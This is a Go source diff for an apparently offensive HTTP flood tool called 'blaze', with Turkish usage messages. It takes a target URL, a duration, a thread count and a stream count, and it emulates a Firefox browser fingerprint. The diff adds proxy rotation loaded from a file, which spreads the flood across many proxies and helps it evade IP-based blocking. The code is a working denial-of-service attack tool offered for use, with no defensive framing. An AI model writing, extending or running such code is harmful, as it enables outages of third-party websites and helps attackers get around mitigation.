@@ -18,9 +18,16 @@ import (
 
 func main() {
 	if len(os.Args) < 4 {
-		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy]")
+		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya]")
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
+		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET proxies.txt")
+		fmt.Println()
+		fmt.Println("proxy dosya formati (satir satir):")
+		fmt.Println("  ip:port")
+		fmt.Println("  ip:port:user:pass")
+		fmt.Println("  socks5://ip:port")
+		fmt.Println("  http://user:pass@ip:port")
 		os.Exit(1)
 	}
 
@@ -42,15 +49,15 @@ func main() {
 		method = strings.ToUpper(os.Args[5])
 	}
 
-	proxyURL := ""
+	proxyArg := ""
 	if len(os.Args) >= 7 {
-		proxyURL = os.Args[6]
+		proxyArg = os.Args[6]
 	}
 
-	run(targetURL, durSec, threads, streams, method, proxyURL)
+	run(targetURL, durSec, threads, streams, method, proxyArg)
 }
 
-func run(targetURL string, durSec, threads, streams int, method, proxyURL string) {
+func run(targetURL string, durSec, threads, streams int, method, proxyArg string) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	totalConcurrent := threads * streams
@@ -78,8 +85,21 @@ func run(targetURL string, durSec, threads, streams int, method, proxyURL string
 		gofire.WithReadBufferSize(128 * 1024),
 	}
 
-	if proxyURL != "" {
-		opts = append(opts, gofire.WithProxy(proxyURL))
+	// Detect proxy mode: single proxy URL vs proxy file
+	var proxyRotator *gofire.ProxyRotator
+	if proxyArg != "" {
+		if isProxyFile(proxyArg) {
+			// Load proxy list from file
+			var err error
+			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
+			if err != nil {
+				fmt.Fprintf(os.Stderr, "hata: proxy dosyasi yuklenemedi: %v\n", err)
+				os.Exit(1)
+			}
+		} else {
+			// Single proxy URL
+			opts = append(opts, gofire.WithProxy(proxyArg))
+		}
 	}
 
 	client, err := gofire.Emulate(gofire.Firefox148, opts...)
@@ -89,10 +109,17 @@ func run(targetURL string, durSec, threads, streams int, method, proxyURL string
 	}
 	defer client.Close()
 
+	// Apply proxy rotator after client creation
+	if proxyRotator != nil {
+		client.SetProxyRotator(proxyRotator)
+	}
+
 	fmt.Printf("hedef: %s | sure: %ds | thread: %d | stream: %d | toplam: %d | method: %s\n",
 		targetURL, durSec, threads, streams, totalConcurrent, method)
-	if proxyURL != "" {
-		fmt.Printf("proxy: %s\n", proxyURL)
+	if proxyRotator != nil {
+		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
+	} else if proxyArg != "" {
+		fmt.Printf("proxy: %s\n", proxyArg)
 	}
 
 	// Ilk once tek bir test requesti at, hata varsa goster
@@ -290,6 +317,23 @@ func run(targetURL string, durSec, threads, streams int, method, proxyURL string
 	errMu.Unlock()
 
 	fmt.Println()
+}
+
+// isProxyFile checks if the argument is a file path (vs a proxy URL).
+func isProxyFile(s string) bool {
+	// If it contains :// it's a URL
+	if strings.Contains(s, "://") {
+		return false
+	}
+	// If file exists on disk, it's a file
+	if _, err := os.Stat(s); err == nil {
+		return true
+	}
+	// If it ends with .txt or .list, treat as file
+	if strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv") {
+		return true
+	}
+	return false
 }
 
 func mustInt(s, name string) int {
